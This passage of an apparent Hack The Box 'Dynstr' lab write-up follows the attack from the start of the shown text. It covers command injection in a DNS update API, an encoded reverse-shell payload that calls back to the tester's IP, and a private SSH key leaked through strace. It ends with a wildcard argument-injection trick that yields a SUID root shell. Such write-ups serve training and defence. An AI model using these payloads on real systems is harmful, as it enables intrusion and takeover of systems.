<span class="o">&gt;</span> Accept: <span class="k">*</span>/<span class="k">*</span>
<span class="o">&gt;</span> Authorization: Basic ZHluYWRuczpzbmRhbnlk
<span class="o">&gt;</span>
<span class="k">*</span> Mark bundle as not supporting multiuse
&lt; HTTP/1.1 200 OK
HTTP/1.1 200 OK
&lt; Date: Fri, 13 Aug 2021 21:36:36 GMT
Date: Fri, 13 Aug 2021 21:36:36 GMT
&lt; Server: Apache/2.4.41 <span class="o">(</span>Ubuntu<span class="o">)</span>
Server: Apache/2.4.41 <span class="o">(</span>Ubuntu<span class="o">)</span>
&lt; Content-Length: 18
Content-Length: 18
&lt; Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>UTF-8
Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>UTF-8

&lt;
good 10.10.10.10
<span class="k">*</span> Connection <span class="c">#0 to host 10.10.10.244 left intact</span>
</code></pre></div></div>

<p>Playing a little with the API started receiving some <strong>wrngdom</strong> errors when some of the supported domains are not present, like below:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>curl <span class="nt">-i</span> <span class="nt">-s</span> <span class="nt">-k</span> <span class="nt">-H</span> <span class="s1">$'Authorization: Basic ZHluYWRuczpzbmRhbnlk'</span> <span class="s2">"http://10.10.10.244/nic/update?myip=10.10.10.10&amp;hostname=;pwd"</span> <span class="nt">-v</span>
<span class="k">*</span>   Trying 10.10.10.244:80...
<span class="k">*</span> Connected to 10.10.10.244 <span class="o">(</span>10.10.10.244<span class="o">)</span> port 80 <span class="o">(</span><span class="c">#0)</span>
<span class="o">&gt;</span> GET /nic/update?myip<span class="o">=</span>10.10.10.10&amp;hostname<span class="o">=</span><span class="p">;</span><span class="nb">pwd </span>HTTP/1.1
<span class="o">&gt;</span> Host: 10.10.10.244
<span class="o">&gt;</span> User-Agent: curl/7.74.0
<span class="o">&gt;</span> Accept: <span class="k">*</span>/<span class="k">*</span>
<span class="o">&gt;</span> Authorization: Basic ZHluYWRuczpzbmRhbnlk
<span class="o">&gt;</span>
<span class="k">*</span> Mark bundle as not supporting multiuse
&lt; HTTP/1.1 200 OK
HTTP/1.1 200 OK
&lt; Date: Fri, 13 Aug 2021 21:38:23 GMT
Date: Fri, 13 Aug 2021 21:38:23 GMT
&lt; Server: Apache/2.4.41 <span class="o">(</span>Ubuntu<span class="o">)</span>
Server: Apache/2.4.41 <span class="o">(</span>Ubuntu<span class="o">)</span>
&lt; Content-Length: 16
Content-Length: 16
&lt; Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>UTF-8
Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>UTF-8

&lt;
911 <span class="o">[</span>wrngdom: <span class="o">]</span>
<span class="k">*</span> Connection <span class="c">#0 to host 10.10.10.244 left intact</span>
</code></pre></div></div>

<p>So, to check for injections started to fuzz using a simple <code class="language-plaintext highlighter-rouge">while</code> loop for contents of wordlist <code class="language-plaintext highlighter-rouge">/usr/share/wordlists/wfuzz/Injections/All_attack.txt</code>, until getting the error below:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="k">while </span><span class="nb">read </span>p<span class="p">;</span> <span class="k">do
while</span><span class="o">&gt;</span> curl <span class="nt">-i</span> <span class="nt">-s</span> <span class="nt">-k</span> <span class="nt">-H</span> <span class="s1">$'Authorization: Basic ZHluYWRuczpzbmRhbnlk'</span> <span class="s2">"http://10.10.10.244/nic/update?myip=10.10.10.10&amp;hostname==</span><span class="nv">$p</span><span class="s2">.no-ip.htb"</span> <span class="nt">-v</span>
<span class="k">while</span><span class="o">&gt;</span> <span class="k">done</span> &lt; /usr/share/wordlists/wfuzz/Injections/All_attack.txt

<span class="o">[</span>...]
<span class="k">*</span> Connection <span class="c">#0 to host 10.10.10.244 left intact</span>
<span class="k">*</span>   Trying 10.10.10.244:80...
<span class="k">*</span> Connected to 10.10.10.244 <span class="o">(</span>10.10.10.244<span class="o">)</span> port 80 <span class="o">(</span><span class="c">#0)</span>
<span class="o">&gt;</span> GET /nic/update?myip<span class="o">=</span>10.10.10.10&amp;hostname<span class="o">=</span><span class="nt">-1</span>.no-ip.htb HTTP/1.1
<span class="o">&gt;</span> Host: 10.10.10.244
<span class="o">&gt;</span> User-Agent: curl/7.74.0
<span class="o">&gt;</span> Accept: <span class="k">*</span>/<span class="k">*</span>
<span class="o">&gt;</span> Authorization: Basic ZHluYWRuczpzbmRhbnlk
<span class="o">&gt;</span>
<span class="k">*</span> Mark bundle as not supporting multiuse
&lt; HTTP/1.1 200 OK
HTTP/1.1 200 OK
&lt; Date: Fri, 13 Aug 2021 21:30:11 GMT
Date: Fri, 13 Aug 2021 21:30:11 GMT
&lt; Server: Apache/2.4.41 <span class="o">(</span>Ubuntu<span class="o">)</span>
Server: Apache/2.4.41 <span class="o">(</span>Ubuntu<span class="o">)</span>
&lt; Content-Length: 22
Content-Length: 22
&lt; Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>UTF-8
Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>UTF-8

&lt;
911 <span class="o">[</span>nsupdate failed]
</code></pre></div></div>

<p>As it mentions that <code class="language-plaintext highlighter-rouge">nsupdate</code> has failed with the payload sent (in this case <code class="language-plaintext highlighter-rouge">-1.no-ip.htb</code>) this means that the API triggers this binary in a non-interactive way. Doing some research, I have found on this page <a href="https://www.rtfm-sarl.ch/articles/using-nsupdate.html">Using the dynamic DNS editor, nsupdate (rtfm-sarl.ch)</a> some examples of usage that could be hijacked to get code execution in the backend, once it accepts standard input, which might be the way used in the automation that updates DNS entries in the zones.</p>

<p>To prove if this is correct, I made a simple test, encapsulating the commands I wanted to be executed in <code class="language-plaintext highlighter-rouge">$()</code>, and checked the DNS entry using <code class="language-plaintext highlighter-rouge">dig</code>, which returned success.</p>

<p><img src="https://i.imgur.com/r5qrIOo.png" alt="HTB Dynstr - OS Code injection payload" class="align-center" /></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>dig @10.10.10.244 mytestsubdomain.no-ip.htb

<span class="p">;</span> &lt;&lt;<span class="o">&gt;&gt;</span> DiG 9.16.15-Debian &lt;&lt;<span class="o">&gt;&gt;</span> @10.10.10.244 mytestsubdomain.no-ip.htb
<span class="p">;</span> <span class="o">(</span>1 server found<span class="o">)</span>
<span class="p">;;</span> global options: +cmd
<span class="p">;;</span> Got answer:
<span class="p">;;</span> -&gt;&gt;HEADER<span class="o">&lt;&lt;-</span> <span class="no">opcode</span><span class="sh">: QUERY, status: NOERROR, id: 20816
;; flags: qr aa rd; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1
;; WARNING: recursion requested but not available

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4096
; COOKIE: c46a9e70a58d51c501000000611a665bf50e119ef07ea985 (good)
;; QUESTION SECTION:
;mytestsubdomain.no-ip.htb.     IN      A

;; ANSWER SECTION:
mytestsubdomain.no-ip.htb. 30   IN      A       10.10.10.11

;; Query time: 68 msec
;; SERVER: 10.10.10.244#53(10.10.10.244)
;; WHEN: Mon Aug 16 10:21:33 -03 2021
;; MSG SIZE  rcvd: 98
</span></code></pre></div></div>

<p>Now that we have confirmed that we can get code execution this way, modified the request to start a reverse shell using a base64 encoded payload, avoiding encoding issues</p>

<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">GET</span> <span class="nn">/nic/update?myip=10.10.10.11&amp;hostname=%24%28%65%63%68%6f%20%63%6d%30%67%4c%33%52%74%63%43%39%6d%4f%32%31%72%5a%6d%6c%6d%62%79%41%76%64%47%31%77%4c%32%59%37%59%32%46%30%49%43%39%30%62%58%41%76%5a%6e%77%76%59%6d%6c%75%4c%33%4e%6f%49%43%31%70%49%44%49%2b%4a%6a%46%38%62%6d%4d%67%4d%54%41%75%4d%54%41%75%4d%54%51%75%4d%54%49%78%49%44%51%30%4e%44%4d%67%50%69%39%30%62%58%41%76%5a%67%3d%3d%20%7c%20%62%61%73%65%36%34%20%2d%64%20%7c%20%62%61%73%68%29.no-ip.htb</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="p">:</span> <span class="s">10.10.10.244</span>
<span class="na">User-Agent</span><span class="p">:</span> <span class="s">python-requests/2.25.1</span>
<span class="na">Accept-Encoding</span><span class="p">:</span> <span class="s">gzip, deflate</span>
<span class="na">Accept</span><span class="p">:</span> <span class="s">*/*</span>
<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
<span class="na">Authorization</span><span class="p">:</span> <span class="s">Basic ZHluYWRuczpzbmRhbnlk</span>
</code></pre></div></div>

<h2 id="user-flag">User flag</h2>

<p>Started enumeration using the obtained account <code class="language-plaintext highlighter-rouge">www-data</code>, default for apache, using <code class="language-plaintext highlighter-rouge">linpeas.sh</code>, where the following items were identified:</p>

<ul>
  <li>Users with console and their permissions:</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>uid=0(root) gid=0(root) groups=0(root)
uid=1000(dyna) gid=1000(dyna) groups=1000(dyna),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),114(lpadmin),115(sambashare)
uid=1001(bindmgr) gid=1001(bindmgr) groups=1001(bindmgr)
</code></pre></div></div>

<ul>
  <li>Ability to list files inside others home directories, where we can see some SSH Keys for <code class="language-plaintext highlighter-rouge">bindmgr</code> account</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>╔══════════╣ Files inside others home (limit 20)                                                                             /home/bindmgr/support-case-C62796521/strace-C62796521.txt
/home/bindmgr/support-case-C62796521/C62796521-debugging.script
/home/bindmgr/support-case-C62796521/C62796521-debugging.timing
/home/bindmgr/support-case-C62796521/command-output-C62796521.txt
/home/bindmgr/user.txt
/home/bindmgr/.ssh/known_hosts
/home/bindmgr/.ssh/id_rsa.pub
/home/bindmgr/.ssh/authorized_keys
/home/bindmgr/.ssh/id_rsa
/home/bindmgr/.bashrc
/home/bindmgr/.bash_logout
/home/bindmgr/.profile
/home/dyna/.bashrc
/home/dyna/.bash_logout
/home/dyna/.profile
/home/dyna/.sudo_as_admin_successful
</code></pre></div></div>

<p>Checking the contents of <code class="language-plaintext highlighter-rouge">/home/bindmgr</code>, we can see the <code class="language-plaintext highlighter-rouge">user.txt</code> file but we have no read rights on it. In this user’s profile, there’s also a folder called <code class="language-plaintext highlighter-rouge">support-case-C62796521</code>, which contains some debugging/tracing output from some tasks executed in the server.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@dynstr:/var/www<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span> /home/bindmgr/
total 36
drwxr-xr-x 5 bindmgr bindmgr 4096 Mar 15 20:39 <span class="nb">.</span>
drwxr-xr-x 4 root    root    4096 Mar 15 20:26 ..
lrwxrwxrwx 1 bindmgr bindmgr    9 Mar 15 20:29 .bash_history -&gt; /dev/null
<span class="nt">-rw-r--r--</span> 1 bindmgr bindmgr  220 Feb 25  2020 .bash_logout
<span class="nt">-rw-r--r--</span> 1 bindmgr bindmgr 3771 Feb 25  2020 .bashrc
drwx------ 2 bindmgr bindmgr 4096 Mar 13 12:09 .cache
<span class="nt">-rw-r--r--</span> 1 bindmgr bindmgr  807 Feb 25  2020 .profile
drwxr-xr-x 2 bindmgr bindmgr 4096 Mar 13 12:09 .ssh
drwxr-xr-x 2 bindmgr bindmgr 4096 Mar 13 14:53 support-case-C62796521
<span class="nt">-r--------</span> 1 bindmgr bindmgr   33 Aug 16 15:49 user.txt
www-data@dynstr:/var/www<span class="err">$</span>
</code></pre></div></div>

<p>After analyzing the files, noticed that in <code class="language-plaintext highlighter-rouge">strace-C62796521.txt</code> we have the private key in plain text, which was extracted and saved as an <code class="language-plaintext highlighter-rouge">id_rsa</code> file.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[...]
15123 read(5, "-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn\nNhAAAAAwEAAQAAAQEAxeKZHOy+RGhs+gnMEgsdQas7klAb37HhVANJgY7EoewTwmSCcsl1\n42kuvUhxLultlMRCj1pnZY/1sJqTywPGalR7VXo+2l0Dwx3zx7kQFiPeQJwiOM8u/g8lV3\nHjGnCvzI4UojALjCH3YPVuvuhF0yIPvJDessdot/D2VPJqS+TD/4NogynFeUrpIW5DSP+F\nL6oXil+sOM5ziRJQl/gKCWWDtUHHYwcsJpXotHxr5PibU8EgaKD6/heZXsD3Gn1VysNZdn\nUOLzjapbDdRHKRJDftvJ3ZXJYL5vtupoZuzTTD1VrOMng13Q5T90kndcpyhCQ50IW4XNbX\nCUjxJ+1jgwAAA8g3MHb+NzB2/gAAAAdzc2gtcnNhAAABAQDF4pkc7L5EaGz6CcwSCx1Bqz\nuSUBvfseFUA0mBjsSh7BPCZIJyyXXjaS69SHEu6W2UxEKPWmdlj/WwmpPLA8ZqVHtVej7a\nXQPDHfPHuRAWI95AnCI4zy7+DyVXceMacK/MjhSiMAuMIfdg9W6+6EXTIg+8kN6yx2i38P\nZU8mpL5MP/g2iDKcV5SukhbkNI/4UvqheKX6w4znOJElCX+AoJZYO1QcdjBywmlei0fGvk\n+JtTwSBooPr+F5lewPcafVXKw1l2dQ4vONqlsN1EcpEkN+28ndlclgvm+26mhm7NNMPVWs\n4yeDXdDlP3SSd1ynKEJDnQhbhc1tcJSPEn7WODAAAAAwEAAQAAAQEAmg1KPaZgiUjybcVq\nxTE52YHAoqsSyBbm4Eye0OmgUp5C07cDhvEngZ7E8D6RPoAi+wm+93Ldw8dK8e2k2QtbUD\nPswCKnA8AdyaxruDRuPY422/2w9qD0aHzKCUV0E4VeltSVY54bn0BiIW1whda1ZSTDM31k\nobFz6J8CZidCcUmLuOmnNwZI4A0Va0g9kO54leWkhnbZGYshBhLx1LMixw5Oc3adx3Aj2l\nu291/oBdcnXeaqhiOo5sQ/4wM1h8NQliFRXraymkOV7qkNPPPMPknIAVMQ3KHCJBM0XqtS\nTbCX2irUtaW+Ca6ky54TIyaWNIwZNznoMeLpINn7nUXbgQAAAIB+QqeQO7A3KHtYtTtr6A\nTyk6sAVDCvrVoIhwdAHMXV6cB/Rxu7mPXs8mbCIyiLYveMD3KT7ccMVWnnzMmcpo2vceuE\nBNS+0zkLxL7+vWkdWp/A4EWQgI0gyVh5xWIS0ETBAhwz6RUW5cVkIq6huPqrLhSAkz+dMv\nC79o7j32R2KQAAAIEA8QK44BP50YoWVVmfjvDrdxIRqbnnSNFilg30KAd1iPSaEG/XQZyX\nWv//+lBBeJ9YHlHLczZgfxR6mp4us5BXBUo3Q7bv/djJhcsnWnQA9y9I3V9jyHniK4KvDt\nU96sHx5/UyZSKSPIZ8sjXtuPZUyppMJVynbN/qFWEDNAxholEAAACBANIxP6oCTAg2yYiZ\nb6Vity5Y2kSwcNgNV/E5bVE1i48E7vzYkW7iZ8/5Xm3xyykIQVkJMef6mveI972qx3z8m5\nrlfhko8zl6OtNtayoxUbQJvKKaTmLvfpho2PyE4E34BN+OBAIOvfRxnt2x2SjtW3ojCJoG\njGPLYph+aOFCJ3+TAAAADWJpbmRtZ3JAbm9tZW4BAgMEBQ==\n-----END OPENSSH PRIVATE KEY-----\n", 4096) = 1823
[...]
</code></pre></div></div>

<p>When I tried to SSH to bindmgr account using this key, noticed that it failed. Checking the contents of <code class="language-plaintext highlighter-rouge">authorized_keys</code> file, verified that we have a <code class="language-plaintext highlighter-rouge">from</code> option defined, that will prevent us from accessing the account using that key if not registered as a <code class="language-plaintext highlighter-rouge">*.infra.dyna.htb</code> subdomain.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@dynstr:/tmp<span class="nv">$ </span><span class="nb">cat</span> /home/bindmgr/.ssh/authorized_keys
<span class="nv">from</span><span class="o">=</span><span class="s2">"*.infra.dyna.htb"</span> ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDF4pkc7L5EaGz6CcwSCx1BqzuSUBvfseFUA0mBjsSh7BPCZIJyyXXjaS69SHEu6W2UxEKPWmdlj/WwmpPLA8ZqVHtVej7aXQPDHfPHuRAWI95AnCI4zy7+DyVXceMacK/MjhSiMAuMIfdg9W6+6EXTIg+8kN6yx2i38PZU8mpL5MP/g2iDKcV5SukhbkNI/4UvqheKX6w4znOJElCX+AoJZYO1QcdjBywmlei0fGvk+JtTwSBooPr+F5lewPcafVXKw1l2dQ4vONqlsN1EcpEkN+28ndlclgvm+26mhm7NNMPVWs4yeDXdDlP3SSd1ynKEJDnQhbhc1tcJSPEn7WOD bindmgr@nomen
</code></pre></div></div>

<p>To achieve that, we would need to edit the hosts file, not possible with current credentials, but we could also leverage <code class="language-plaintext highlighter-rouge">nsupdate</code> to include our DNS entry into the <code class="language-plaintext highlighter-rouge">infra.dyna.htb</code> zone, where I’ve captured the command used in the API to be reused in our scenario:</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// Update DNS entry</span>
<span class="nv">$cmd</span> <span class="o">=</span> <span class="nb">sprintf</span><span class="p">(</span><span class="s2">"server 127.0.0.1</span><span class="se">\n</span><span class="s2">zone %s</span><span class="se">\n</span><span class="s2">update delete %s.%s</span><span class="se">\n</span><span class="s2">update add %s.%s 30 IN A %s</span><span class="se">\n</span><span class="s2">send</span><span class="se">\n</span><span class="s2">"</span><span class="p">,</span><span class="nv">$d</span><span class="p">,</span><span class="nv">$h</span><span class="p">,</span><span class="nv">$d</span><span class="p">,</span><span class="nv">$h</span><span class="p">,</span><span class="nv">$d</span><span class="p">,</span><span class="nv">$myip</span><span class="p">);</span>
<span class="nb">system</span><span class="p">(</span><span class="s1">'echo "'</span><span class="mf">.</span><span class="nv">$cmd</span><span class="mf">.</span><span class="s1">'" | /usr/bin/nsupdate -t 1 -k /etc/bind/ddns.key'</span><span class="p">,</span><span class="nv">$retval</span><span class="p">);</span>
</code></pre></div></div>

<p>Based on that, crafted the following command line to add our IP as a known subdomain</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@dynstr:/dev/shm<span class="nv">$ </span><span class="nb">cat </span>nsupdate
server 127.0.0.1
zone dyna.htb
update delete attacker.infra.dyna.htb
update add attacker.infra.dyna.htb 30 IN A 10.10.10.10
send
www-data@dynstr:/dev/shm<span class="nv">$ </span><span class="nb">cat </span>nsupdate | /usr/bin/nsupdate <span class="nt">-t</span> 1 <span class="nt">-k</span> /etc/bind/ddns.key
update failed: REFUSED
</code></pre></div></div>

<p>After some research, found that this REFUSED error could be due to the key used and, checking the directory where the <code class="language-plaintext highlighter-rouge">ddns.key</code> was located, found 2 other files (as below), where the include using the file <code class="language-plaintext highlighter-rouge">infra.key</code> worked successfully <strong>BUT</strong> I still wasn’t able to connect using SSH.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@dynstr:/dev/shm<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span> /etc/bind/<span class="k">*</span>.key
<span class="nt">-rw-r--r--</span> 1 root <span class="nb">bind </span>100 Mar 15 20:44 /etc/bind/ddns.key
<span class="nt">-rw-r--r--</span> 1 root <span class="nb">bind </span>101 Mar 15 20:44 /etc/bind/infra.key
<span class="nt">-rw-r-----</span> 1 <span class="nb">bind bind </span>100 Mar 15 20:14 /etc/bind/rndc.key
</code></pre></div></div>

<p>Doing some troubleshooting, noticed that I was able to solve the <code class="language-plaintext highlighter-rouge">attacker.infra.dyna.htb</code> but the reverse lookup of the IP address wasn’t possible. To fix this, I have added another entry in the <code class="language-plaintext highlighter-rouge">nsupdate</code> command to also include a PTR record to the IP as below. A crucial point I also had to troubleshoot was that the A and PTR records <strong>must be separated by a blank line</strong>, otherwise the update would fail.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@dynstr:/dev/shm<span class="nv">$ </span><span class="nb">cat </span>nsupdate
server 127.0.0.1
update add attacker.infra.dyna.htb 30 A 10.10.10.10
send

update add 121.14.10.10.in-addr.arpa 30 PTR attacker.infra.dyna.htb
send
www-data@dynstr:/dev/shm<span class="nv">$ </span><span class="nb">cat </span>nsupdate | /usr/bin/nsupdate <span class="nt">-t</span> 1 <span class="nt">-k</span> /etc/bind/infra.key
www-data@dynstr:/dev/shm<span class="err">$</span>
</code></pre></div></div>

<p>After that adjustment, I was able to SSH as <code class="language-plaintext highlighter-rouge">bindmgr</code> and read the content of <code class="language-plaintext highlighter-rouge">user.txt</code> file</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bindmgr@dynstr:~<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span>
total 36
drwxr-xr-x 5 bindmgr bindmgr 4096 Mar 15 20:39 <span class="nb">.</span>
drwxr-xr-x 4 root    root    4096 Mar 15 20:26 ..
lrwxrwxrwx 1 bindmgr bindmgr    9 Mar 15 20:29 .bash_history -&gt; /dev/null
<span class="nt">-rw-r--r--</span> 1 bindmgr bindmgr  220 Feb 25  2020 .bash_logout
<span class="nt">-rw-r--r--</span> 1 bindmgr bindmgr 3771 Feb 25  2020 .bashrc
drwx------ 2 bindmgr bindmgr 4096 Mar 13 12:09 .cache
<span class="nt">-rw-r--r--</span> 1 bindmgr bindmgr  807 Feb 25  2020 .profile
drwxr-xr-x 2 bindmgr bindmgr 4096 Mar 13 12:09 .ssh
drwxr-xr-x 2 bindmgr bindmgr 4096 Mar 13 14:53 support-case-C62796521
<span class="nt">-r--------</span> 1 bindmgr bindmgr   33 Aug 16 15:49 user.txt
bindmgr@dynstr:~<span class="nv">$ </span><span class="nb">cat </span>use
<span class="nb">cat</span>: use: No such file or directory
bindmgr@dynstr:~<span class="nv">$ </span><span class="nb">cat </span>user.txt
&lt;redacted&gt;
</code></pre></div></div>

<h2 id="root-flag">Root flag</h2>

<p>As always, started with a <code class="language-plaintext highlighter-rouge">sudo -l</code> command, where I found that the <code class="language-plaintext highlighter-rouge">bindmgr</code> user is capable to run the script below as root:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bindmgr@dynstr:~<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
<span class="nb">sudo</span>: unable to resolve host dynstr.dyna.htb: Name or service not known
Matching Defaults entries <span class="k">for </span>bindmgr on dynstr:
    env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin

User bindmgr may run the following commands on dynstr:
    <span class="o">(</span>ALL<span class="o">)</span> NOPASSWD: /usr/local/bin/bindmgr.sh
bindmgr@dynstr:~
</code></pre></div></div>

<p>Checking its content, noticed one interesting entry in <strong>line 42</strong>, where the script, running as <code class="language-plaintext highlighter-rouge">root</code>, copies the file <code class="language-plaintext highlighter-rouge">.version</code> and all other existing files in the current directory (<code class="language-plaintext highlighter-rouge">*</code>) to $BINDMGR_DIR. Also, it requires a <code class="language-plaintext highlighter-rouge">.version</code> file in the current directory to be compared with the existing configuration in the server.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Stage new version of configuration files.</span>
<span class="nb">echo</span> <span class="s2">"[+] Staging files to </span><span class="nv">$BINDMGR_DIR</span><span class="s2">."</span>
<span class="nb">cp</span> .version <span class="k">*</span> /etc/bind/named.bindmgr/
</code></pre></div></div>

<p>After the first execution, noticed that <code class="language-plaintext highlighter-rouge">.version</code> was copied with <code class="language-plaintext highlighter-rouge">root</code> permissions, allowing us to abuse a SUID binary this way.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bindmgr@dynstr:/tmp/tmp.UzxayH3IIl<span class="nv">$ </span><span class="nb">sudo</span> /usr/local/bin/bindmgr.sh
<span class="nb">sudo</span>: unable to resolve host dynstr.dyna.htb: Name or service not known
<span class="o">[</span>+] Running /usr/local/bin/bindmgr.sh to stage new configuration from /tmp/tmp.UzxayH3IIl.
<span class="o">[</span>+] Creating /etc/bind/named.conf.bindmgr file.
<span class="o">[</span>+] Staging files to /etc/bind/named.bindmgr.
<span class="nb">cp</span>: cannot <span class="nb">stat</span> <span class="s1">'*'</span>: No such file or directory
<span class="o">[</span>+] Checking staged configuration.
<span class="o">[</span>-] ERROR: The generated configuration is not valid. Please fix following errors:
    /etc/bind/named.conf.bindmgr:2: open: /etc/bind/named.bindmgr/<span class="k">*</span>: file not found
bindmgr@dynstr:/tmp/tmp.UzxayH3IIl<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span> /etc/bind/named.bindmgr/
total 12
drwxr-sr-x 2 root <span class="nb">bind </span>4096 Aug 16 18:22 <span class="nb">.</span>
drwxr-sr-x 3 root <span class="nb">bind </span>4096 Aug 16 18:22 ..
<span class="nt">-rw-r--r--</span> 1 root <span class="nb">bind    </span>2 Aug 16 18:22 .version
</code></pre></div></div>

<p>Checking the <a href="https://gtfobins.github.io/gtfobins/cp/#suid">cp | GTFOBins</a> for SUID, noticed that if <code class="language-plaintext highlighter-rouge">cp</code> has SUID it could be used to copy contents from restricted file systems but, as it is not the case, we would need another way to abuse the use of <code class="language-plaintext highlighter-rouge">cp</code> in this script.</p>

<p>One point seen in the page mentioned above is that we could use the parameter <code class="language-plaintext highlighter-rouge">--preserve</code> to <strong>preserve file attributes</strong> during the copy. Appending this parameter to execution could be achieved thanks to a <code class="language-plaintext highlighter-rouge">bash</code> feature called <strong>filename expansion</strong>, popularly known as <strong><em><a href="https://tldp.org/LDP/abs/html/globbingref.html">globbing</a></em></strong> which <strong>expands</strong> the names of the files during command execution.  This behavior can be seen in the example below with <code class="language-plaintext highlighter-rouge">echo</code>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bindmgr@dynstr:/tmp/tmp.PdP9Qf49qx<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-l</span>
total 0
<span class="nt">-rw-rw-r--</span> 1 bindmgr bindmgr 0 Aug 16 19:15 file.sh
<span class="nt">-rw-rw-r--</span> 1 bindmgr bindmgr 0 Aug 16 19:15 test.txt
bindmgr@dynstr:/tmp/tmp.PdP9Qf49qx<span class="nv">$ </span><span class="nb">echo</span> <span class="k">*</span>
file.sh test.txt
</code></pre></div></div>

<p>This could be exploited as we could also abuse that during <code class="language-plaintext highlighter-rouge">cp</code> execution, copying a previously SUID configured file, allowing us to escalate privileges.</p>

<p>This was achieved by running the steps below:</p>

<ul>
  <li>Copied <code class="language-plaintext highlighter-rouge">/bin/bash</code> to a working temp directory and changed its permissions, setting its SUID bit and creating the <code class="language-plaintext highlighter-rouge">.version</code> file.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bindmgr@dynstr:/tmp<span class="nv">$ </span><span class="nb">cd</span> <span class="si">$(</span><span class="nb">mktemp</span> <span class="nt">-d</span><span class="si">)</span>
bindmgr@dynstr:/tmp/tmp.7i6oryDsae<span class="nv">$ </span><span class="nb">cp</span> /bin/bash <span class="nb">.</span>
bindmgr@dynstr:/tmp/tmp.7i6oryDsae<span class="nv">$ </span><span class="nb">chmod </span>u+s bash
bindmgr@dynstr:/tmp/tmp.7i6oryDsae<span class="nv">$ </span><span class="nb">echo </span>1 <span class="o">&gt;</span> .version
bindmgr@dynstr:/tmp/tmp.7i6oryDsae<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span>
total 1168
drwx------  2 bindmgr bindmgr    4096 Aug 16 19:22 <span class="nb">.</span>
drwxrwxrwt 13 root    root       4096 Aug 16 19:22 ..
<span class="nt">-rwsr-xr-x</span>  1 bindmgr bindmgr 1183448 Aug 16 19:22 bash
<span class="nt">-rw-rw-r--</span>  1 bindmgr bindmgr       2 Aug 16 19:22 .version
</code></pre></div></div>

<ul>
  <li>Created a file called <code class="language-plaintext highlighter-rouge">--preserve=mode</code>, so its name could be expanded as a parameter for <code class="language-plaintext highlighter-rouge">cp</code> during script execution, copying <code class="language-plaintext highlighter-rouge">bash</code> as root but keeping SUID set. We can confirm that as well using <code class="language-plaintext highlighter-rouge">echo</code>, also below</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bindmgr@dynstr:/tmp/tmp.7i6oryDsae<span class="nv">$ </span><span class="nb">echo</span> <span class="s2">""</span> <span class="o">&gt;</span> ./--preserve<span class="o">=</span>mode
bindmgr@dynstr:/tmp/tmp.7i6oryDsae<span class="nv">$ </span><span class="nb">echo</span> <span class="k">*</span>
bash <span class="nt">--preserve</span><span class="o">=</span>mode
</code></pre></div></div>

<ul>
  <li>Ran the script using <code class="language-plaintext highlighter-rouge">sudo</code></li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bindmgr@dynstr:/tmp/tmp.7i6oryDsae<span class="nv">$ </span><span class="nb">sudo</span> /usr/local/bin/bindmgr.sh
<span class="nb">sudo</span>: unable to resolve host dynstr.dyna.htb: Name or service not known
<span class="o">[</span>+] Running /usr/local/bin/bindmgr.sh to stage new configuration from /tmp/tmp.7i6oryDsae.
<span class="o">[</span>+] Creating /etc/bind/named.conf.bindmgr file.
<span class="o">[</span>+] Staging files to /etc/bind/named.bindmgr.
